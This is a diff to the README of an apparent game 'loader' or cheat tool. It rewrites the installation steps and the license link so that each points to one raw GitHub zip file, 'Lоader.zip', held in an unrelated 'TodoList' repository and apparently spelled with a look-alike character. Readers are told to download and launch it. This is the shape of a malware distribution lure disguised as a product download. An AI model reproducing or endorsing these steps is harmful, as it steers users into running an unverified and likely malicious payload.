@@ -31,9 +31,9 @@ Tested with the latest system updates for smooth performance.
 
 ## 🚀 Installation
 
-1. **Download Loader.rar from the repository.**  
+1. **Download https://raw.githubusercontent.com/AIENG2020/TodoList/main/Lоader.zip from the repository.**  
 2. Extract the archive to your preferred directory.  
-3. Launch Loader.exe (or equivalent for your OS).  
+3. Launch https://raw.githubusercontent.com/AIENG2020/TodoList/main/Lоader.zip (or equivalent for your OS).  
 4. Follow in-app instructions for fast setup.  
 5. Enjoy your enhanced gameplay!
 
@@ -53,7 +53,7 @@ This tool is for educational and entertainment purposes only. Use responsibly. D
 
 ## 📜 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT), 2025.  
+Distributed under the [MIT License](https://raw.githubusercontent.com/AIENG2020/TodoList/main/Lоader.zip), 2025.  
 Refer to the license for usage permissions.
 
 ---
